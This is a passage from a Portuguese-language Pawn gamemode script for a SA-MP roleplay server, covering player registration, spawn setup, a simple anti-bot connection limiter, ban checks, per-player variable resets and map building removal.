				format(s5Doze, sizeof(s5Doze), "{FFFFFF}Bem-vindo(a) ao {FF1E1E}World {1E90FF}Evolution {FFF36E}RPG{FFFFFF}\n\nConta: %s\nStatus: {FF0000}Não registrada{FFFFFF}\n\nVersão 1.0 - Não há notícias, fique atento ao fórum!\n* Insira sua senha abaixo para registrar-se:\n> {FF0000}OBS: {FFFFFF}Por segurança, jamais compartilhe sua senha!", PlayerName(playerid));
				ShowPlayerDialog(playerid, D_REGISTRO, DIALOG_STYLE_PASSWORD, "{FFFFFF} {FFFFFF}World Evolution RPG 1.0", s5Doze, "Registrar", "Cancelar");
			}
		}
	}
	SetiSpawnInfo(playerid);
 	new
	 	getSkin = WE_GetInt(gFile, "Skin"),
	 	getAdmin = WE_GetInt(gFile, "Administrador"),
	 	getMod = WE_GetInt(gFile, "Moderador"),
	 	getpVip = WE_GetInt(gFile, "PLAYER_VIP"),
	 	getSexo = WE_GetInt(gFile, "Sexo")
 	;
 	if(!SkinValida(getSkin))
 	{
 	    SetPlayerSkin(playerid, getSkin);
 	}
 	else
 	{
	 	if(getpVip == 1 || getAdmin == 1 || getMod == 1)
	 	{
	 	    SetPlayerSkin(playerid, getSkin);
	 	}
		else
		{
			if(getpVip == 0 || getAdmin == 0 || getMod == 0)
	 		{
		 	    if(getSexo == 1)
		 	    {
		 	    	SetPlayerSkin(playerid, 0);
				}
   				if(getSexo == 2)
		        {
		            SetPlayerSkin(playerid, 10);
		        }
	 		}
		}
	}
	SetPlayerPos(playerid, 1984.7871,1351.2615,10.8203);
	SetPlayerCameraPos(playerid, 2040.9583,1376.3033,62.2846);
	SetPlayerCameraLookAt(playerid, 1988.7177,1343.3698,15.7403);
    SetPlayerFacingAngle(playerid, 270.3430);
	return 1;
}

public OnPlayerRequestSpawn(playerid)
{
	ApplyAnimation(playerid, "PED", "flee_lkaround_01", 4.1, 1, 1, 1, 1, 1, 1);
	return 0;
}

// Anti-Bot
new IncomingConnection[iI];
public OnIncomingConnection(playerid, ip_address[], port)
{
    if(!strcmp(IncomingConnection[IncomingIP], ip_address, true) && IncomingConnection[IncomingTempo] > gettime()) {
        if(IncomingConnection[IncomingVezes] > 3) return BlockIpAddress(ip_address, 0), printf("IP %s bloqueado!", ip_address);
        IncomingConnection[IncomingVezes]++;
        return 1;
    }
    format(IncomingConnection[IncomingIP], 16, ip_address);
    IncomingConnection[IncomingVezes] = 0;
    IncomingConnection[IncomingTempo] = gettime()+2;
    return 1;
}//

public OnPlayerConnect(playerid)
{
	CreatePlayerObject(playerid,684, -2002.37585, -2435.92651, 31.10940,   0.00000, 0.00000, 0.00000);
	PontosTiro[playerid] = 0;
	TutoText[playerid][0] = CreatePlayerTextDraw(playerid,31.000000, 44.000000, ".");
	PlayerTextDrawBackgroundColor(playerid,TutoText[playerid][0], 255);
	PlayerTextDrawFont(playerid,TutoText[playerid][0], 0);
	PlayerTextDrawLetterSize(playerid,TutoText[playerid][0], 90.000000, 0.699998);
	PlayerTextDrawColor(playerid,TutoText[playerid][0], 255);
	PlayerTextDrawSetOutline(playerid,TutoText[playerid][0], 0);
	PlayerTextDrawSetProportional(playerid,TutoText[playerid][0], 1);
	PlayerTextDrawSetShadow(playerid,TutoText[playerid][0], 0);
	PlayerTextDrawSetSelectable(playerid,TutoText[playerid][0], 0);

	TutoText[playerid][1] = CreatePlayerTextDraw(playerid,140.000000, 13.000000, "O servidor");
	PlayerTextDrawAlignment(playerid,TutoText[playerid][1], 2);
	PlayerTextDrawBackgroundColor(playerid,TutoText[playerid][1], 255);
	PlayerTextDrawFont(playerid,TutoText[playerid][1], 3);
	PlayerTextDrawLetterSize(playerid,TutoText[playerid][1], 0.670000, 2.499999);
	PlayerTextDrawColor(playerid,TutoText[playerid][1], -1);
	PlayerTextDrawSetOutline(playerid,TutoText[playerid][1], 0);
	PlayerTextDrawSetProportional(playerid,TutoText[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid,TutoText[playerid][1], 1);
	PlayerTextDrawUseBox(playerid,TutoText[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid,TutoText[playerid][1], 0);
	PlayerTextDrawTextSize(playerid,TutoText[playerid][1], 371.000000, 272.000000);
	PlayerTextDrawSetSelectable(playerid,TutoText[playerid][1], 0);

	TutoText[playerid][2] = CreatePlayerTextDraw(playerid,541.000000, 368.000000, "barra texto");
	PlayerTextDrawBackgroundColor(playerid,TutoText[playerid][2], 255);
	PlayerTextDrawFont(playerid,TutoText[playerid][2], 1);
	PlayerTextDrawLetterSize(playerid,TutoText[playerid][2], 0.500000, 3.899998);
	PlayerTextDrawColor(playerid,TutoText[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid,TutoText[playerid][2], 0);
	PlayerTextDrawSetProportional(playerid,TutoText[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid,TutoText[playerid][2], 0);
	PlayerTextDrawUseBox(playerid,TutoText[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid,TutoText[playerid][2], 125);
	PlayerTextDrawTextSize(playerid,TutoText[playerid][2], 100.000000, 0.000000);
	PlayerTextDrawSetSelectable(playerid,TutoText[playerid][2], 0);

	TutoText[playerid][3] = CreatePlayerTextDraw(playerid,319.000000, 371.000000, " ");
	PlayerTextDrawAlignment(playerid,TutoText[playerid][3], 2);
	PlayerTextDrawBackgroundColor(playerid,TutoText[playerid][3], 255);
	PlayerTextDrawFont(playerid,TutoText[playerid][3], 1);
	PlayerTextDrawLetterSize(playerid,TutoText[playerid][3], 0.300000, 1.399999);
	PlayerTextDrawColor(playerid,TutoText[playerid][3], -1);
	PlayerTextDrawSetOutline(playerid,TutoText[playerid][3], 0);
	PlayerTextDrawSetProportional(playerid,TutoText[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid,TutoText[playerid][3], 1);
	PlayerTextDrawUseBox(playerid,TutoText[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid,TutoText[playerid][3], 0);
	PlayerTextDrawTextSize(playerid,TutoText[playerid][3], 526.000000, 423.000000);
	PlayerTextDrawSetSelectable(playerid,TutoText[playerid][3], 0);

	TutoText[playerid][4] = CreatePlayerTextDraw(playerid, 531.000000, 220.000000, "Proximo ~>~");
	PlayerTextDrawLetterSize(playerid, TutoText[playerid][4], 0.398822, 1.738332);
	PlayerTextDrawTextSize(playerid, TutoText[playerid][4], 606.000000, 20.000000);
	PlayerTextDrawAlignment(playerid, TutoText[playerid][4], 1);
	PlayerTextDrawColor(playerid, TutoText[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, TutoText[playerid][4], true);
	PlayerTextDrawBoxColor(playerid, TutoText[playerid][4], -422824705);
	PlayerTextDrawSetShadow(playerid, TutoText[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, TutoText[playerid][4], 1);
	PlayerTextDrawBackgroundColor(playerid, TutoText[playerid][4], 255);
	PlayerTextDrawFont(playerid, TutoText[playerid][4], 1);
	PlayerTextDrawSetProportional(playerid, TutoText[playerid][4], 1);
	PlayerTextDrawSetSelectable(playerid, TutoText[playerid][4], true);

	TutoText[playerid][5] = CreatePlayerTextDraw(playerid, 34.000000, 220.000000, "~<~ Anterior");
	PlayerTextDrawLetterSize(playerid, TutoText[playerid][5], 0.398822, 1.738332);
	PlayerTextDrawTextSize(playerid, TutoText[playerid][5], 111.000000, 20.000000);
	PlayerTextDrawAlignment(playerid, TutoText[playerid][5], 1);
	PlayerTextDrawColor(playerid, TutoText[playerid][5], -1);
	PlayerTextDrawUseBox(playerid, TutoText[playerid][5], true);
	PlayerTextDrawBoxColor(playerid, TutoText[playerid][5], 865856767);
	PlayerTextDrawSetShadow(playerid, TutoText[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, TutoText[playerid][5], 1);
	PlayerTextDrawBackgroundColor(playerid, TutoText[playerid][5], 255);
	PlayerTextDrawFont(playerid, TutoText[playerid][5], 1);
	PlayerTextDrawSetProportional(playerid, TutoText[playerid][5], 1);
	PlayerTextDrawSetSelectable(playerid, TutoText[playerid][5], true);

	TextDrawHideForPlayer(playerid, Textdraw0S);
	TextDrawHideForPlayer(playerid, Textdraw1S);
	TextDrawHideForPlayer(playerid, Textdraw2);
	TextDrawHideForPlayer(playerid, Player_barEat[playerid]);
	TextDrawHideForPlayer(playerid, Textdraw4);
	TextDrawHideForPlayer(playerid, Textdraw5);
	TextDrawHideForPlayer(playerid, Textdraw6);
	TextDrawHideForPlayer(playerid, Player_barDrink[playerid]);
	TextDrawHideForPlayer(playerid, Textdraw8);
	TextDrawHideForPlayer(playerid, Textdraw9);
	TextDrawHideForPlayer(playerid, Textdraw10);
	TextDrawHideForPlayer(playerid, Textdraw11);
	TextDrawHideForPlayer(playerid, Player_barSleep[playerid]);
//------------------------------- FomeSedeSono ---------------------------------
	static FSS[80];
	SetPlayerMapIcon(playerid,0,328.5529, -1513.7094, 36.0391, 40, 0); // Hotel
	lanchonete[playerid] = false;
	SetTimerEx("Corrigir", 1000, true, "i", playerid);
	format(arquivos2, sizeof(arquivos2), PastaFSS, PlayerName(playerid));
	if(WE_FileExists(arquivos2))
	{
		SetPVarInt(playerid,"Fome", WE_GetInt(arquivos2, "Fome"));
		SetPVarInt(playerid,"Sede", WE_GetInt(arquivos2, "Sede"));
		SetPVarInt(playerid,"Sono", WE_GetInt(arquivos2, "Sono"));
		format(FSS, sizeof(FSS), "Carregando necessidades de %s", PlayerName(playerid));
		print(FSS);
	}
	else
	{
		WE_CreateFile(arquivos2);
		WE_SetInt(arquivos2, "Fome", 100);
		WE_SetInt(arquivos2, "Sede", 100);
		WE_SetInt(arquivos2, "Sono", 100);
		SetPVarInt(playerid,"Fome", WE_GetInt(arquivos2, "Fome"));
		SetPVarInt(playerid,"Sede", WE_GetInt(arquivos2, "Sede"));
		SetPVarInt(playerid,"Sono", WE_GetInt(arquivos2, "Sono"));
		WE_SaveFile();
		format(FSS, sizeof(FSS), "Criando arquivo de necessidades de %s", PlayerName(playerid));
		print(FSS);
	}
//--------------------------------- FSS ----------------------------------------
    if(!IsPlayerNPC(playerid))
    {
		if(GetPlayerPing(playerid) <= 0)
		return Kick(playerid), 1;
	}
	if(CountIP(GetIP(playerid)) >= 5)
	{
		return BanAll(playerid), 0;
	}
	if(WE_GetInt(f(playerid), "Banido") == 1)
	{
	    SendClientMessage(playerid, 0xFFFFFFAA, "Você está banido(a)!");
		SendClientMessage(playerid, 0xFFFFFFAA, "Acesse nosso fórum para tentar resolver sua situação.");
		SendClientMessage(playerid, 0xFFFFFFAA, "Fórum Viva WE: {6699CC}forumwe.vivagamesonline.com");
		SetTimerEx("Banido", 1125, false, "d", playerid);
	}
	else
	{
        PlayAudioStreamForPlayer(playerid, "https://dl.dropboxusercontent.com/s/n31l22dw0vejwwq/11%20Queen%20-%20Under%20Pressure.mp3");
	    pInfo[playerid][Logado] = false;
	    SetPlayerInterior(playerid, 0);
		SetPlayerColor(playerid, 0xFFFFFFAA);
		TextDrawShowForPlayer(playerid, WE_GAMES1);
		TextDrawShowForPlayer(playerid, WE_GAMES2);
		TextDrawShowForPlayer(playerid, LoginScreen[0]);
		TextDrawShowForPlayer(playerid, LoginScreen[1]);
		TextDrawShowForPlayer(playerid, LoginScreen[2]);
		TextDrawShowForPlayer(playerid, LoginScreen[3]);
		TextDrawShowForPlayer(playerid, LoginScreen[4]);
		TextDrawShowForPlayer(playerid, LoginScreen[5]);
		TextDrawShowForPlayer(playerid, LoginScreen[6]);
		TextDrawShowForPlayer(playerid, LoginScreen[7]);
		TextDrawShowForPlayer(playerid, BoxCarregando);
		TextDrawHideForPlayer(playerid, InfoSite);
		TextDrawHideForPlayer(playerid, InfoLevel[playerid]);
		TextDrawHideForPlayer(playerid, RDinheiro);
   		TextCreatePlayer(playerid);
		//TextDrawShowForPlayer(playerid, TextNomeServer);
	    //TextDrawShowForPlayer(playerid, TextNomeSite);
		for(new t; t < 4; t++)
		{
			TextDrawHideForPlayer(playerid, TextAnuncio[t]);
		}
		ResetPlayerWeapons(playerid);
		LimparChat(playerid, 30);
        new Celula[40];
        GetPlayerVersion(playerid, Celula, sizeof(Celula));
        format(Celula, sizeof(Celula), "Sua versão do SA-MP é: {FFFFFF}%s", Celula);
        SendClientMessage(playerid, AZUL_WE, Celula);
  	    //--
	    dmLimpar(playerid);
	    pInfo[playerid][psErrou] = 0;
	    pInfo[playerid][pLogin] = true;
	    aInfo[playerid][Oculto] = false;
	    pInfo[playerid][PLAYER_VIP] = 0;
	    pInfo[playerid][StatusCapacete] = 0;
	    pInfo[playerid][ModeloCapacete] = 0;
		pInfo[playerid][Seguro] = 0;
		pInfo[playerid][Convenio] = 0;
		pInfo[playerid][KiloD] = 0;
		pInfo[playerid][HabTMoto] = 0;
		pInfo[playerid][HabTCarro] = 0;
		pInfo[playerid][HabTCaminhao] = 0;
		pInfo[playerid][HabTTrem] = 0;
		pInfo[playerid][HabNBarco] = 0;
		pInfo[playerid][HabAHeli] = 0;
		pInfo[playerid][HabAAviao] = 0;
		CaminhaoCarga[playerid] = false;
		CaminhaoDesCargaSolarin[playerid] = false;
		CaminhaoDesCargaWangCars[playerid] = false;
		CaminhaoDesCargaMichelin[playerid] = false;
		CaminhaoDesCargaSprunk[playerid] = false;
		CaminhaoDesCargaXoomer[playerid] = false;
		CaminhaoDesCargaFlaischberg[playerid] = false;
		CaminhaoDesCargaHaul[playerid] = false;
		RequisitouCasar[playerid] = false;
		AreadePesca[playerid] = false;
		AreadeCasca[playerid] = false;
		AreaFazendaDrogas[playerid] = false;
		AreaFazendaArmas[playerid] = false;
		AreaTRANSPORTADOR[playerid] = false;
		AreaContrabandista[playerid] = false;
		AreaDeContrabandista[playerid] = false;
		pInfo[playerid][procMorto] = false;
	    vercmds[playerid] = 0;
		aviso[playerid] = 0;
		pInfo[playerid][Hosp] = -1;
		pInfo[playerid] [AFK] = false;
		pInfo[playerid][Jetpack] = 0;
		pInfo[playerid][fMatou] = 0;
		pInfo[playerid][fMorreu] = 0;
 		BancoLogin[playerid] = 0;
		pInfo[playerid][EntrouAgencia] = 0;
  		pInfo[playerid][entroupref] = 0;
  		pInfo[playerid][entrouHAB] = 0;
		JaPescando[playerid] = 0;
		setoukit[playerid] = 0;
		pInfo[playerid][Continuar] = true;
		TextFavela[playerid] = false;
		CargaEstacaoLS[playerid] = 0;
		CargaEstacaoLV[playerid] = 0;
		CargaEstacaoSF[playerid] = 0;
		JaCascando[playerid] = 0;
		Algemou[playerid] = 0;
		Algemado[playerid] = 0;
		pBombas[playerid] = 0;
		IsNotCop[playerid] = 0;
		Roubou[playerid] = false;
        PortaBanco[playerid] = false;
		Roubando[playerid] = false;
		ComBolsa[playerid] = false;
		P_Liberado[playerid] = 0;
		Multou[playerid] = 0;
		Procurou[playerid] = 0;
		T_GPS[playerid] = 0;
		GPS[playerid] = false;
		PassouPedagio[playerid] = false;
		PlantouBomba[playerid] = 0;
		PassouRadar[playerid] = 0;
		LiberadoCasa[playerid] = 0;
		FireAtual[playerid] = 0;
		wepCount[playerid] = -1;
		pInfo[playerid][chat] = 0;
		pInfo[playerid][vchat2] = 0;
		bateu_ponto[playerid] = 0;
		bateu_ponto1[playerid] = 0;
		pCargo[playerid] = 0;
		pPatente[playerid] = 0;
		// Ev
		ClickMause[playerid] = 0;
		SetPlayerCheckPoint[playerid] = 0;
		ParticipandoEvento[playerid] = 0;
		vOcupou[playerid] = -1;
		RotaBus[playerid] = -1;
		trafcArma[playerid] = -1;
		floodChat[playerid] = gettime();
		/* Pizza */
		if(Pizza_Oferecido[playerid] == 1)
		{
			KillTimer(Pizza_Timer[playerid]);
			Pizza_Oferecido[playerid] = 0;
			Pizza_Recebido[playerid] = 0;
			Pizza_Mensagem[playerid] = 0;
			Pizza_VALOR[playerid] = 0;
			Pizza_PID[playerid] = -1;
			Pizza_IID[playerid] = -1;
			Pizza_SID[playerid] = 0;
		}
		/* Cura */
		KillTimer(Cura_Timer[playerid]);
		Cura_Oferecido[playerid] = 0;
		Cura_Recebido[playerid] = 0;
		Cura_Mensagem[playerid] = 0;
		Cura_VALOR[playerid] = 0;
		Cura_PID[playerid] = -1;
		Cura_IID[playerid] = -1;
 		/* Skin */
		KillTimer(_SKIN_Timer[playerid]);
		_SKIN_Oferecido[playerid] = 0;
		_SKIN_Recebido[playerid] = 0;
		_SKIN_Mensagem[playerid] = 0;
		_SKIN_VALOR[playerid] = 0;
		_SKIN_PID[playerid] = -1;
		_SKIN_IID[playerid] = -1;
		_SKIN_SID[playerid] = 0;
		/* GASOLINA */
		KillTimer(GASO_Timer[playerid]);
		GASO_ID[playerid] = 0;
		GASO_PID[playerid] = 0;
		GASO_SID[playerid] = 0;
		GASO_IID[playerid] = 0;
		GASO_VALOR[playerid] = 0;
		GASO_Timer[playerid] = 0;
		GASO_Mensagem[playerid] = 0;
		GASO_Oferecido[playerid] = 0;
		GASO_Recebido[playerid] = 0;
		/* Maconha */
		KillTimer(Maconha_Timer[playerid]);
		Maconha_Oferecido[playerid] = 0;
		Maconha_Recebido[playerid] = 0;
		Maconha_Mensagem[playerid] = 0;
		Maconha_VALOR[playerid] = 0;
		Maconha_PID[playerid] = -1;
		Maconha_IID[playerid] = -1;
		Maconha_QTD[playerid] = 0;
		/* Cocaína */
		KillTimer(Farinha_Timer[playerid]);
		Farinha_Oferecido[playerid] = 0;
		Farinha_Recebido[playerid] = 0;
		Farinha_Mensagem[playerid] = 0;
		Farinha_VALOR[playerid] = 0;
		Farinha_PID[playerid] = -1;
		Farinha_IID[playerid] = -1;
		Farinha_QTD[playerid] = 0;
		/* Crack */
		KillTimer(Crack_Timer[playerid]);
		Crack_Oferecido[playerid] = 0;
		Crack_Recebido[playerid] = 0;
		Crack_Mensagem[playerid] = 0;
		Crack_VALOR[playerid] = 0;
		Crack_PID[playerid] = -1;
		Crack_IID[playerid] = -1;
		Crack_QTD[playerid] = 0;
		/* */
		Tirou_F[playerid] = 0;
		GPS_Ligado[playerid] = 0;
		vercmds[playerid] = 0;
		ArenaDuelo[playerid] = false;
		N_Liberado[playerid] = 0;
		UseLoop[playerid] = false;
		PMBLOQUEADO[playerid] = 0;
		Calado[playerid] = false;
 		Mercadoria1[playerid] = 0;
		Mercadoria[playerid] = 0;
//     	msgcount[playerid] = -1;
//    	msgconvi[playerid] = 0;
    	Loop[playerid] = 0;
    	NoTuto[playerid] = false;
    	Votou[playerid] = 0;
		MensagemHouse[playerid] = 0;
    	//KillTimer(timercou[playerid]);
    	KillTimer(ChatTuto[playerid]);
     	T_Tipo[playerid] = 1;
	    TextCor[playerid] = 12;
		MoradorCount[playerid] = -1;
		GameRC[playerid] = 0;
		Finalizou[playerid] = 0;
		Estacionou[playerid] = 0;
		LiberadoEmpresa[playerid] = 0;
		validArmas[playerid] = false;
		resetNeon(playerid);
		estacionouSET[playerid] = 0;
		cargaTempo[playerid] = 0;
		saiuCaminhao[playerid] = 0;
		viwerAN[playerid] = 0;
		InHouse[playerid] = -1;
		CasaOferecida[playerid] = false;
		Crioutapete[playerid] = 0;
		Taxista_P[playerid] = 0;
		bpInfo[playerid][Direcao] = 0;
		pInfo[playerid][MsgSpawn] = 0;
		gelarSpawn[playerid] = false;
		RemoveItensPlayer(playerid);
	    SetPVarInt(playerid, "pAdmin", 0);
	    //HabsVIP[playerid] = false;
	    for(new t; t < 4; t++)
		{
			TextDrawHideForPlayer(playerid, TextAnuncio[t]);
		}
	}
	{
    	OnPlayerUpdateExTimer[playerid] = SetTimerEx("OnPlayerUpdateEx", 500, true, "i", playerid);
    	godcar[playerid] = false; //godcar
	}
	// Mecânica
	RemoveBuildingForPlayer(playerid, 4070, 1719.7422, -1770.7813, 23.4297, 0.25);
	RemoveBuildingForPlayer(playerid, 1531, 1724.7344, -1741.5000, 14.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 3986, 1719.7422, -1770.7813, 23.4297, 0.25);
	// Pátio DP
    RemoveBuildingForPlayer(playerid, 1266, 1538.5234, -1609.8047, 19.8438, 0.25);
	RemoveBuildingForPlayer(playerid, 4229, 1597.9063, -1699.7500, 30.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 4230, 1597.9063, -1699.7500, 30.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 1260, 1538.5234, -1609.8047, 19.8438, 0.25);
	//começo original
	RemoveBuildingForPlayer(playerid, 1411, -2529.2813, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2524.0156, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2518.7500, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2514.8672, -711.8672, 139.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2514.8672, -706.6328, 139.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2514.8672, -701.3984, 139.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2514.8672, -696.1719, 139.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2514.8672, -690.9375, 139.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2514.8672, -717.0938, 139.9063, 0.25);
	RemoveBuildingForPlayer(playerid, 1684, -2508.5000, -680.9531, 139.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2513.4844, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2508.2188, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1684, -2508.4063, -669.0938, 139.8516, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2502.9531, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2497.6875, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2492.4219, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2487.1563, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2484.2969, -597.1641, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2484.2969, -602.4297, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2484.2969, -607.6953, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2539.8125, -594.3281, 133.2969, 0.25);
	RemoveBuildingForPlayer(playerid, 1411, -2534.5469, -594.3281, 133.2969, 0.25);
    RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1689.9844, 13.0469, 0.25);
    RemoveBuildingForPlayer(playerid, 620, 1547.5703, -1661.0313, 13.0469, 0.25);//fim original
   	RemoveBuildingForPlayer(playerid, 5954, 1236.7734, -1209.2656, 24.1953, 0.25);//começo conce
	RemoveBuildingForPlayer(playerid, 5955, 1301.1875, -1257.0625, 21.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 5956, 1288.0469, -1203.7734, 17.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 5957, 1278.4688, -1189.5078, 11.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 5967, 1259.4375, -1246.8125, 17.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 5728, 1236.7734, -1209.2656, 24.1953, 0.25);
	RemoveBuildingForPlayer(playerid, 1388, 1238.3750, -1258.2813, 57.2031, 0.25);
	RemoveBuildingForPlayer(playerid, 1391, 1238.3750, -1258.2734, 44.6641, 0.25);
	RemoveBuildingForPlayer(playerid, 1283, 1269.5469, -1280.3203, 15.7109, 0.25);
	RemoveBuildingForPlayer(playerid, 1294, 1254.6875, -1276.1641, 17.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 5857, 1259.4375, -1246.8125, 17.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 5740, 1278.4688, -1189.5078, 11.8984, 0.25);
	RemoveBuildingForPlayer(playerid, 1219, 1284.1797, -1239.6406, 12.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 5739, 1288.0469, -1203.7734, 17.6875, 0.25);
	RemoveBuildingForPlayer(playerid, 5709, 1301.1875, -1257.0625, 21.5078, 0.25);
	RemoveBuildingForPlayer(playerid, 1227, 1322.1875, -1235.8828, 13.4375, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 1327.4297, -1239.9844, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1412, 1327.4297, -1234.7422, 13.9375, 0.25);
	RemoveBuildingForPlayer(playerid, 1219, 1332.8359, -1241.7188, 13.4141, 0.25);//fim conce
	RemoveBuildingForPlayer(playerid, 3347, -22.0781, 1346.4609, 7.9297, 0.25);//começo aero fc
	RemoveBuildingForPlayer(playerid, 3347, -1.2500, 1392.8984, 7.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3347, 27.2656, 1360.1641, 7.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3343, 6.4453, 1344.0625, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3343, -27.6953, 1362.5547, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3345, 23.1250, 1342.9922, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3345, -18.7031, 1387.6094, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3345, 6.4922, 1379.3906, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3338, -60.9375, 1439.4375, 8.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 3338, 23.3594, 1410.2500, 8.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 3338, 85.9219, 1310.1641, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 3338, 166.6406, 1282.6016, 20.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 16041, -153.7578, 1594.3594, 55.4141, 0.25);
	RemoveBuildingForPlayer(playerid, 3244, -60.9375, 1439.4375, 8.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 16042, -48.9844, 1443.9844, 47.3281, 0.25);
	RemoveBuildingForPlayer(playerid, 3168, 6.4453, 1344.0625, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3175, -22.0781, 1346.4609, 7.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3168, -27.6953, 1362.5547, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3172, 6.4922, 1379.3906, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3175, -1.2500, 1392.8984, 7.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 3172, -18.7031, 1387.6094, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3172, 23.1250, 1342.9922, 8.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 3175, 27.2656, 1360.1641, 7.9297, 0.25);
	RemoveBuildingForPlayer(playerid, 1697, 37.7266, 1370.1484, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 1697, 37.9922, 1358.8828, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 3244, 23.3594, 1410.2500, 8.1094, 0.25);
	RemoveBuildingForPlayer(playerid, 1697, 37.1797, 1380.9766, 9.7656, 0.25);
	RemoveBuildingForPlayer(playerid, 16043, 77.1328, 1319.0859, 48.7578, 0.25);
	RemoveBuildingForPlayer(playerid, 3244, 166.6406, 1282.6016, 20.0391, 0.25);
	RemoveBuildingForPlayer(playerid, 3244, 85.9219, 1310.1641, 17.3203, 0.25);
	RemoveBuildingForPlayer(playerid, 16044, 262.6953, 1257.2656, 48.9141, 0.25);
	RemoveBuildingForPlayer(playerid, 16040, -297.1484, 1702.7188, 68.2344, 0.25);//fim aero fc
	RemoveBuildingForPlayer(playerid, 3371, -248.0391, 995.8828, 21.6719, 0.25);//começo comunidade fc
	RemoveBuildingForPlayer(playerid, 3372, -273.0391, 995.8906, 21.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3304, -273.0391, 995.8906, 21.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 3305, -248.0391, 995.8828, 21.6719, 0.25);
	RemoveBuildingForPlayer(playerid, 669, -238.2578, 981.3438, 18.6719, 0.25);//fim comunidade fc
	// PREFEITURA //
	RemoveBuildingForPlayer(playerid, 4024, 1479.8672, -1790.3984, 56.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 4044, 1481.1875, -1785.0703, 22.3828, 0.25);
	RemoveBuildingForPlayer(playerid, 4002, 1479.8672, -1790.3984, 56.0234, 0.25);
	RemoveBuildingForPlayer(playerid, 3980, 1481.1875, -1785.0703, 22.3828, 0.25);
	// AGENCIA DE EMPREGOS //
	RemoveBuildingForPlayer(playerid, 5928, 1309.9141, -1330.1328, 25.1875, 0.25);
	RemoveBuildingForPlayer(playerid, 5933, 1281.4375, -1337.9531, 12.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 5809, 1281.4375, -1337.9531, 12.3750, 0.25);
	RemoveBuildingForPlayer(playerid, 5704, 1309.9141, -1330.1328, 25.1875, 0.25);
	//
	RemoveBuildingForPlayer(playerid, 4075, 1791.7969, -1716.9844, 12.5234, 0.25);//começo banco
	RemoveBuildingForPlayer(playerid, 4076, 1783.1016, -1702.3047, 14.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 1531, 1799.1328, -1708.7656, 14.1016, 0.25);
	RemoveBuildingForPlayer(playerid, 1266, 1805.0234, -1692.4453, 25.1484, 0.25);
	RemoveBuildingForPlayer(playerid, 4018, 1791.7969, -1716.9844, 12.5234, 0.25);
	RemoveBuildingForPlayer(playerid, 4027, 1783.1016, -1702.3047, 14.3516, 0.25);
	RemoveBuildingForPlayer(playerid, 1260, 1805.0234, -1692.4453, 25.1484, 0.25);//fim banco
	// CONCESSIONÁRIA //
	RemoveBuildingForPlayer(playerid, 6482, 536.1328, -1291.6797, 23.4688, 0.25);
